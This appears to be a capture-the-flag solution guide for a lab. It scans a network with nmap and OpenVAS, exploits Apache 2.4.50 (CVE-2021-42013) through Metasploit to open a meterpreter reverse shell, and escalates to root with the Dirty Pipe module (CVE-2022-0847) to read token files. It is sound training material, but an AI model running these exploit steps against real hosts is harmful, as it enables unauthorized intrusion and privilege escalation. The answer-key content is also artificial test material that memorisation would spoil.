# You'll Find A Way! 

*Solution Guide*

## Overview

This solution guide covers the walk-through on finding and exploting the vulnerable services to obtain the required challenge tokens. 
 
All answers for this challenge are generated dynamically. The format for the answers will be a first name, followed by a last name and then a two digit number. It will follow the CamelCase format with no spaces. Here is an example: `JohnDoe23`.

## Question 1

### Network Discovery
1. The first step you can take from the `analyst` VM is to check your IP address. This will allow you to scan the network next. To see your IP address, perform the following command: 
```
ip a
``` 

2. Now that you know your IP address, you can proceed to scan the network using `nmap` to see which additional hosts and open ports are available. Since your IP address is in the `10.5.5.0` network and you have a subnet mask of `/24`, you can use the following command to scan the network: 
``` 
nmap -sV 10.5.5.0/24 
```
3. The purpose of the `-sV` parameter is to attempt to determine the version of the service running on the ports discovered on each host. Here is a picture of a similar output you should be getting **(Your IPs might be different)**.

![Image 1](./img/img_1.png)

>For the rest of this guide we will be using `10.5.5.120` as the `analyst` box IP address and `10.5.5.56` as the IP address for the `outdated-xeno` box. Your IPs might be different than the ones found in this guide. 

4. Now, you'll notice that, aside from your (`analyst`) and the challenge server (`challenge`), there is an additional box (`outdated-xeno`) with two services on different open ports, ssh on port `22` and http on `80`. You can also notice that the service running on port `22` is `OpenSSH version 9.0p1` and the service running on port `80` is `Apache version 2.4.50`. 

5. Since port 80 is open, you can navigate to `http://10.5.5.56:80` on Firefox and notice the website is under construction. Nothing else on plain sight to look for here.

### Scanning discovered IP for Vulnerabilities using OpenVAS

>OpenVAS is stopped on startup to avoid consuming resources.

1. With the information gathered above, you can proceed to scan the IP you found for any known vulnerabilities. First, start OpenVAS using the following command: 
```
sudo gvm-start
```

2. Once OpenVAS starts, it should open the web interface automatically but, in case it didn't, you can proceed and open Firefox and navigate to the following URL and use the provided OpenVAS credentials found above: 
```
https://127.0.0.1:9392
```

3. Once you are logged in, you can navigate to the `Scans` tab. Here, you can hover on top of the "magic wand" on the upper left and then click `Task Wizard`. Now, you can enter the IP you discovered (`10.5.5.56` in this guide) and press `Start Scan` This will automatically begin to scan the provided IP address for vulnerabilities. 

4. Doing the scan this way should take less than 15 minutes. The progress of the scan is going to be shown on the `Scans` tab, under `Tasks`. To see the vulnerabilities found, you can hover the `Scans` tab and click on `Vulnerabilities`. 

5. Once the scan finishes, on the `Vulnerabilities` tab, you will notice there is a `High Severity Vulnerability` found related to the `Apache HTTP Server 2.4.49 - 2.4.50`. If you click on this vulnerability, you will be able to see valuable information, including the CVE related to this vulnerability. In this case, the CVE is `CVE-2021-42013`. This vulnerability allows an attacker to achieve remote code execution (RCE). Let's get to work. 

### Apache 2.4.50 Vulnerability Exploit

1. Since you know the vulnerability allows RCE, let's see if Metasploit has an exploit we can use. Let's open metasploit with the following command: 
```
msfconsole
```

2. Once metasploit opens, you can use the search command to see if there is an exploit for the CVE you found. 
```
search CVE-2021-42013
```

3. Great news, you found two exploits. By reading the **Description**, the first one looks like it would help us better since, the other one says is just a scanner. We can use this exploit by typing the following command: 
```
use 0
```

4. Now, you need to see how to configure this exploit to work correctly. Let's start by seeing the options available. 
```
show options
```

5. Here, we want to focus first on the ones that are `Required` such as RHOSTS, RPORT and LHOST. `RHOSTS` stands for `Remote Hosts`, `RPORT` stands for `Remote Port` and `LHOST` stands for `Local Host`. To set the new values for this settings, type the following commands. 
```
set RHOSTS 10.5.5.56
set RPORT 80
set LHOST 10.5.5.120
```

6. Since the port doesn't require negotiating any SSL for outgoing connections, you need to also change the `SSL` setting: 
```
set SSL false
```

7. Now that the options are set, it's time to run the exploit. 
```
run
```
8. Sucess! You will now have a meterpreter session open! 

### User navigation on meterpreter

1. Now that you have a meterpreter session, your first task should be to figure out to which user you obtained access. Performing the following command will let you know the current server username. 
```
getuid
```

2. After you perform that command, you noticed you currently have access to  `user`. Since you know the first flag is on the `user`'s Desktop, you can navigate there with the following command: 
```
cd /home/user/Desktop/
```

3. Now, this next command will allow you to see what files are under this directory. 
```
ls 
```

4. You will see a file named `token1.txt` and another one called `IMPORTANT.txt`. Let's read the contents of `token1.txt` first. 
```
cat token1.txt
```

5. You officially found your first token on the `user` Desktop. Let's read the other file and see what it says. 
```
cat IMPORTANT.txt
```

6. Based on this document, the kernel version of this image is outdated. You can proceed and do a quick Open Source Intelligence (OSINT) and find out what's wrong. After a quick search, you should find out that this kernel version has a vulnerability known as `The Dirty Pipe` vulnerability (CVE-2022-0847). 

>Make sure to keep this meterpreter session **OPEN** since you will be using it on the second part of this challenge.

## Question 2

### Dirty Pipe Vulnerability

1. Exploiting `The Dirty Pipe` vulnerability allows overwriting data in local arbitrary read-only files. This can lead to privilege escalation because unprivileged processes can inject code into root processes.

2. In our case, we'll continue using our part metasploit session to exploit this vulnerability.

3. From the same meterpreter session you had, perform the following command: 
```
background
```

4. The `background` command will send your meterpreter session to the background and return you the metasploit console, hence, if you type the following command, it will show you the running sessions (Make sure to write down or remember your session ID): 
```
sessions
```

5. Having the previous session running on the background will allow you to run an additional exploit on that session. Let's see how this works. 

6. Start by searching an exploit for `The Dirty Pipe` vulnerability.
```
search CVE-2022-0847
```

7. You will notice that there is only one exploit you can choose. Let's go ahead and use this one. 
```
use 0
```

8. Once you choose the exploit, you need to see how to configure this exploit to work correctly. Let's start by seeing the options available:
```
show options
```

9. The first setting we want to configure is the `SESSION`. You will be using the session ID you wrote down (or remembered) here. In our case, it was session ID `1`: 
```
set SESSION 1 
```

10. Then, let's set the other `REQUIRED` field which is `LHOST`: 
```
set LHOST 10.5.5.120
```

11. Once you finish configuring your exploit options, it's time to run the exploit. 
```
run
```

### Root Access Obtained

1. Great! You now have a new meterpreter shell available. First step again is to verify what is you current user: 
```
getuid
```

2. And, just like that, you are root! The description of the challenge tells you that the second flag should be on the `/root/` directory. Let's navigate there: 
```
cd /root/
```

3. To see what is found on this directory, type the following: 
```
ls
```

4. You will see a file called `token2.txt`. Let's read the contents of it!
```
cat token2.txt
```
You have officialy gathered both flags! Well done!
